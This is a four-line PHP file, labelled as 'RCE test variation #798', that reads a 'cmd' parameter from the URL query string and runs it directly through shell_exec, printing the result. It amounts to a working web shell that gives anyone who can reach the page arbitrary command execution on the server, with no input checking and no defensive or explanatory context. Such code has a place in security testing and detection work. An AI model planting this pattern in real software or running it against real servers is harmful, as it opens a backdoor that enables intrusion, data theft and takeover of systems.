<?php
// RCE test variation #798
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>